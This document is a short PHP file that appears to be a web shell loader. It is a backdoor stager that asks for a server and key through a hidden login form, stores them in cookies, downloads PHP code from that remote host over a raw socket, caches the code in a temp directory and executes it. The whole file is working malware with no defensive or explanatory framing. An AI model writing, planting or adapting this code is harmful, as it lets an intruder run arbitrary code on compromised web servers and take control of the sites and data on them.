<?php
error_reporting(E_ALL);
@ini_set('display_errors', 1);
@ini_set('allow_url_fopen', 1);
class init
{    
    var $server = 0;
    var $tmpdir = '/tmp';
    var $tmp = '';
    var $tdir = 'dfphp';
    var $key = 0;
    var $file = __FILE__;
    var $dir = 0;
    var $cache = 1;
    
    function init()
    {   
		$s = $_SERVER['SCRIPT_FILENAME'];
		$this->tdir = md5($s);
        if(empty($this->dir)) $this->dir = dirname($s);
		$this->tmp(); 
        $this->tmp = $this->tmpdir.'/'.$this->tdir;
        if(!is_dir($this->tmp)) mkdir($this->tmp);
        $this->tmp .= '/';
        $sp = @session_save_path();
        if(strpos($sp, 'tcp')===FALSE && !@is_writable($sp))@session_save_path($this->tmp);
        @session_start();
        $this->key = @$_COOKIE['_key'];
        $this->server = @$_COOKIE['_host'];
        if(empty($this->key) || empty($this->server)) return $this->login();
        $this->server = 'http://'.$this->server.'/img/?q=';
        $this->load('core', 1, $this);
    }
    
    function tmp()
    {
        if(@is_writable($this->tmpdir))return;
        $this->tmpdir = @ini_get('upload_tmp_dir');
        if(@is_writable($this->tmpdir))return;
        $this->tmpdir = @sys_get_temp_dir();
        if(@is_writable($this->tmpdir))return;
        $this->tmpdir = @getenv('TMP');
        if(@is_writable($this->tmpdir))return;
        $this->tmpdir = @$_ENV['TMP'];
        if(@is_writable($this->tmpdir))return;
		$this->tmpdir = $this->dir;
		if(@is_writable($this->tmpdir))return;
        die('tmpdir');
    }
    
    function load($class, $new=0, $papam=0, $file=0)
    {
        $q = $class.md5($class.'__'.$this->key);
        $f = $this->tmp.$q;
        if(!$this->cache||!is_file($f))
        {
            $d = $this->get($this->server.$q);
            if(!$d) die('no load');
            $d = preg_replace('/^([^\<]+)\</ui', '<', $d);
            if(strpos($d, 'error message:')!==FALSE) die('<div onclick="document.cookie=\'_key=\'">'.$d.'</div>');
            $load = $this->file_put($f, $d);
        }
        if($file) return $f;
        require_once($f);
        if($new) return ($papam ? new $class($papam) : new $class);
    }
    
    function get($g, $p=0)
    {
        $g = parse_url($g);
        $d = '';
        $h = ($p?'POST':'GET')." ".$g['path'];
        if(isset($g['query'])) $h .= '?'.$g['query'];
        $h .= " HTTP/1.0\r\n";
        $h .= "Host: ".$g['host']."\r\n";
        if($p)
        {
            $h .= "Content-Type: application/x-www-form-urlencoded\r\n";
            $h .= "Content-Length: ".strlen($p)."\r\n\r\n".$p."\r\n\r\n";
        }else $h .= "Connection: Close\r\n\r\n";

        $fp = fsockopen($g['host'], 80);
        //var_dump($fp);exit;
        if($fp) {
            @fputs($fp, $h);
            while(!feof($fp)) $d .= fgets($fp, 1024);
            @fclose($fp);
            return $d;
        }
        return FALSE;
    }
    
    function file_get($file)
    {
        $fp = @fopen($file, 'rb');
        $length = @filesize($file);
        $data = @fread($fp, $length);
        @fclose($fp);
        return $data;
    }
    
    function file_put($file, $data)
    {
        $fp = @fopen($file, 'w');
        $test = @fwrite($fp, $data);
        @fclose($fp);
        return $test;
    }
    
    function login()
    {
?>
<html>
    <body>
        <noindex><input type="text" id="server" placeholder="server"> <input placeholder="key" type="password" onkeyup="if(event.keyCode=='13'){document.cookie='_key='+this.value;document.cookie='_host='+document.getElementById('server').value;top.location.reload()}"></noindex>
    </body>
</html>
<?php
    }
}
new init;